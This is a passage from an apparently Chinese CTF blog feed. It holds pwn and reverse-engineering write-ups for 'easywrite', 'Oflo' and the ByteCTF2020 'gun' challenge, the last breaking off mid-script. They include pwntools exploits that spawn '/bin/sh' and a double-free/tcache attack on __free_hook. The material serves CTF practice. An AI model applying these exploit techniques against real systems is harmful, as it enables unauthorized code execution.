class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./easywrite&quot;</span>)</span><br><span class="line">    one=<span class="number">0xe6ce3</span></span><br><span class="line">    debug(<span class="number">0x12BA</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Here is your gift:&quot;</span>)</span><br><span class="line">    libc.address=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input your message:&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0x100000000</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    payload += p64(libc.address+<span class="number">0x15fed8</span>-<span class="number">0x10</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Where to write?:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.send(p64(libc.address+<span class="number">0x1648a0</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Any last message?:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)+p64(libc.address-<span class="number">0x39840</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="Oflo"><a href="#Oflo" class="headerlink" title="Oflo"></a>Oflo</h4><p>这题逆向很有意思🤳</p><p>先执行一下发现输出了linux版本并要求输入。</p><p>IDA打开发先main函数有花指令，先去花，之后配合动态调试发现程序在main_0有ptrace函数检查调试器，因此不能直接gdb，得attach上去调。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ps -aux | grep oflo    获得进程号</span><br><span class="line">#sudo gdb attach pid    attach pid</span><br></pre></td></tr></table></figure><p>这样就可以了，动态调的过程中发现程序会将我们的输入的前5位和0x0400A6处的操作码xor,从而不断的修正该处的操作码（10次）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A69 byte_400A69     db 3Bh, 79h, 0EAh, 91h, 2Eh, 0EDh, 0DDh  ;是坏掉的</span><br><span class="line"></span><br><span class="line">改之前</span><br><span class="line">pwndbg&gt; telescope 0x400a69</span><br><span class="line">00:0000│ rsi  0x400a69 ◂— cmp    edi, dword ptr [rcx - 0x16] /* 0x23dded2e91ea793b */</span><br><span class="line"></span><br><span class="line">改之后</span><br><span class="line">pwndbg&gt; telescope 0x400a69</span><br><span class="line">00:0000│        0x400a69 ◂— push   rbp /* 0x40ec8348e5894855 */</span><br></pre></td></tr></table></figure><p>之后程序会call 0x400a69，如过修正的不对的话程序就报错了，而我们发现使用的只是我们输入的前5个如果是flag的话那就是n1ctf，结果把0x400a69修正位push rbp，显然是正确的。</p><p>进入该函数后就是核心的逻辑的，值得注意的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x400a88    mov    byte ptr [rbp - 0x20], 0x35</span><br><span class="line">  0x400a8c    mov    byte ptr [rbp - 0x1f], 0x2d</span><br><span class="line">  0x400a90    mov    byte ptr [rbp - 0x1e], 0x11</span><br><span class="line">  0x400a94    mov    byte ptr [rbp - 0x1d], 0x1a</span><br><span class="line">► 0x400a98    mov    byte ptr [rbp - 0x1c], 0x49</span><br><span class="line">  0x400a9c    mov    byte ptr [rbp - 0x1b], 0x7d</span><br><span class="line">  0x400aa0    mov    byte ptr [rbp - 0x1a], 0x11</span><br><span class="line">  0x400aa4    mov    byte ptr [rbp - 0x19], 0x14</span><br><span class="line">  0x400aa8    mov    byte ptr [rbp - 0x18], 0x2b</span><br><span class="line">  0x400aac    mov    byte ptr [rbp - 0x17], 0x3b</span><br><span class="line">  0x400ab0    mov    byte ptr [rbp - 0x16], 0x3e</span><br><span class="line">  0x400ab4    mov    byte ptr [rbp - 0x15], 0x3d</span><br><span class="line">  0x400ab8    mov    byte ptr [rbp - 0x14], 0x3c</span><br><span class="line">  0x400abc    mov    byte ptr [rbp - 0x13], 0x5f</span><br></pre></td></tr></table></figure><p>显然是用来运算的数据，那么和谁进行运算呢？</p><p>往下调发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x35</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffc117e8ee0 ◂— &#x27;Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7&#x27;</span><br><span class="line"> RDX  0x7b</span><br><span class="line"> RDI  0x7ffc117e8ee0 ◂— &#x27;Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7&#x27;</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x17</span><br><span class="line"> R9   0x7f2f29996d80 (initial) ◂— 0x0</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x206</span><br><span class="line"> R12  0x4005c0 ◂— xor    ebp, ebp /* 0x89485ed18949ed31 */</span><br><span class="line"> R13  0x7ffc117e91d0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffc117e8ea0 —▸ 0x7ffc117e90f0 —▸ 0x400d30 ◂— push   r15 /* 0x41ff894156415741 */</span><br><span class="line"> RSP  0x7ffc117e8e60 —▸ 0x7ffc117e8ec5 ◂— &#x27;&#123;aaaaa&#125;\n&#x27;</span><br><span class="line">*RIP  0x400aff ◂— movzx  ecx, byte ptr [rcx] /* 0xc183c9be0f09b60f */</span><br><span class="line">────────────────────────────────────[ DISASM ]─────────────────────────────────────</span><br><span class="line">   0x400aef    movsx  edx, dl</span><br><span class="line">   0x400af2    mov    ecx, dword ptr [rbp - 0x24]</span><br><span class="line">   0x400af5    movsxd rsi, ecx</span><br><span class="line">   0x400af8    mov    rcx, qword ptr [rbp - 0x38]</span><br><span class="line">   0x400afc    add    rcx, rsi</span><br><span class="line"> ► 0x400aff    movzx  ecx, byte ptr [rcx]</span><br><span class="line">   0x400b02    movsx  ecx, cl</span><br><span class="line">   0x400b05    add    ecx, 2</span><br><span class="line">   0x400b08    xor    edx, ecx</span><br><span class="line">   0x400b0a    cmp    eax, edx</span><br></pre></td></tr></table></figure><p>多循环几次就会发现是和’Linux version ‘各个字符的ord()+2进行xor，进而写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x35</span>,<span class="number">0x2d</span>,<span class="number">0x11</span>,<span class="number">0x1a</span>,<span class="number">0x49</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>,<span class="number">0x14</span>,<span class="number">0x2b</span>,<span class="number">0x3b</span>,<span class="number">0x3e</span>,<span class="number">0x3d</span>,<span class="number">0x3c</span>,<span class="number">0x5f</span>]</span><br><span class="line">code=<span class="string">&#x27;Linux version &#x27;</span></span><br><span class="line">code=<span class="built_in">list</span>(code)</span><br><span class="line">flag=<span class="string">&#x27;n1ctf&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])+<span class="number">2</span>)^(data[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>前面修正机器码的部分调了好久才明白🛌</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF初赛</title>
      <link href="/2020/10/26/ByteCTF2020%E5%88%9D%E8%B5%9B/"/>
      <url>/2020/10/26/ByteCTF2020%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="ByteCTF2020-部分pwn-amp-re"><a href="#ByteCTF2020-部分pwn-amp-re" class="headerlink" title="ByteCTF2020 部分pwn&amp;re"></a>ByteCTF2020 部分pwn&amp;re</h3><blockquote><p>比赛打了两天，挺激烈的，尤其最后时刻大家都疯狂冲分，最后没能守住掉到23了🤦</p></blockquote><span id="more"></span><p>这场比赛给我的最深的感受是我的逆向经验太少了，导致花费了很多时间在没用的函数里，值得好好总结。</p><h4 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h4><p>第一道pwn题，多亏ruan师傅眼疾手快帮我改好了最后的rop，拿到了二血，不然我还得调半天，这种最后的orw可以当作模板来用，好好体会一下。</p><p>题目是道菜单题，2.31的libc，功能大概是buy(购买子弹)–add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 idx; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  idx = sub_1542();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;Enough&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4070[<span class="number">3</span> * idx] == <span class="number">1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;The bullet is Used!&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;Bullet price: &quot;</span>);</span><br><span class="line">  v2 = sub_14E3();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> || (__int64)((__int64)off_4010 - v2) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;Too pool!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x500</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;Too big!&quot;</span>);</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * idx) = sub_11A0(v2);</span><br><span class="line">  qword_4070[<span class="number">3</span> * idx] = <span class="number">1LL</span>;</span><br><span class="line">  puts_0(<span class="string">&quot;Bullet Name: &quot;</span>);</span><br><span class="line">  read_n(*((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * idx), v2);</span><br><span class="line">  off_4010 = (__int64 (__fastcall *)())((<span class="type">char</span> *)off_4010 - v2);</span><br><span class="line">  <span class="keyword">return</span> puts_1(<span class="string">&quot;Confirm&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>load(填充子弹，即将heap链接一起)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_16E1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  puts_0(<span class="string">&quot;Which one do you want to load?&quot;</span>);</span><br><span class="line">  v1 = sub_14E3();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xD</span> || qword_4070[<span class="number">3</span> * v1] == <span class="number">0LL</span> || qword_4070[<span class="number">3</span> * v1] == <span class="number">2LL</span> )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;what??&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4050 )</span><br><span class="line">    *((_QWORD *)&amp;unk_4068 + <span class="number">3</span> * v1) = qword_4050;</span><br><span class="line">  qword_4050 = (__int64)&amp;unk_4060 + <span class="number">24</span> * v1;</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * v1 + <span class="number">2</span>) = <span class="number">2LL</span>;</span><br><span class="line">  <span class="keyword">return</span> puts_1(<span class="string">&quot;Confirm.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shoot(发射子弹)–dele。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_15F8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4050 )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;No bullet!&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;Shoot time: &quot;</span>);</span><br><span class="line">  v3 = (<span class="type">unsigned</span> <span class="type">int</span>)sub_14E3();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; qword_4050 &amp;&amp; i &lt; (<span class="type">int</span>)v3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = *(_QWORD *)qword_4050;</span><br><span class="line">    puts_0(<span class="string">&quot;Pwn! The %s bullet fired.\n&quot;</span>);</span><br><span class="line">    sub_1100(*(_QWORD *)qword_4050, v1);</span><br><span class="line">    v4 = qword_4050;</span><br><span class="line">    qword_4050 = *(_QWORD *)(qword_4050 + <span class="number">8</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_159A();</span><br><span class="line">  <span class="keyword">return</span> puts_0(<span class="string">&quot;%lld bullets left\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析heap的结构体为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">container</span>&#123;</span></span><br><span class="line">  <span class="type">void</span> *heap_ptr</span><br><span class="line">  <span class="type">void</span> *next_heap</span><br><span class="line">  <span class="type">int</span> status   <span class="comment">//1为可用，2为以装载，3为free掉了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点在于load后使用next_heap指针将load的堆块连接起来，但shoot之后next_heap并不会清除，而且heap_ptr也未置0，只是将其free并修改status改为0，但之后我们可以只add回来一个但shoot两个，shoot第二个时会通过next_heap找到那个已经free的堆，由于没有对status的检查导致可以二次dele，但由于2.31加入了tecache的key机制导致tecache_attack无法使用。</p><p>构造二次dele的poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">2</span>)  <span class="comment">#dele第二2个时导致double free</span></span><br></pre></td></tr></table></figure><p>tecache的double free无法使用了，但是fastbin的可以鸭，先填满tecache，再用上面的方法在fastbin构造double free，之后在add时会先取出tecache里的bin，当tecache取完之后会从fastbin取，当第一次从fastbin取时，会把剩下的fastbin放回tecache，因此我们就能利用tecache attack打到free_hook。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  7]: 0x560f03853850 —▸ 0x560f038533b0 —▸ 0x560f03853420 —▸ 0x560f03853490 —▸ 0x560f03853500 —▸ 0x560f03853570 —▸ 0x560f038535e0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x560f03853330 —▸ 0x560f038532c0 ◂— 0x560f03853330   先在fastbin double free</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x560f038536b0 —▸ 0x7f6f3fdadbe0 (main_arena+96) ◂— 0x560f038536b0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure><p>之后取完tecache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x561bb646c330 —▸ 0x561bb646c2c0 ◂— 0x561bb646c330</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x561bb646c6b0 —▸ 0x7fc69a821be0 (main_arena+96) ◂— 0x561bb646c6b0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure><p>第一次取fastbin时（也即改fd）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  3]: 0x556f27c2a2d0 —▸ 0x556f27c2a340 —▸ 0x7fe4fb1f0b28 (__free_hook) ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x556f27c2a6b0 —▸ 0x7fe4fb1edbe0 (main_arena+96) ◂— 0x556f27c2a6b0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure><p>可以看到放回tecache了，由于没size检查，可以打free_hook。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shoot</span>(<span class="params">time</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">30772</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./gun&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line">add(<span 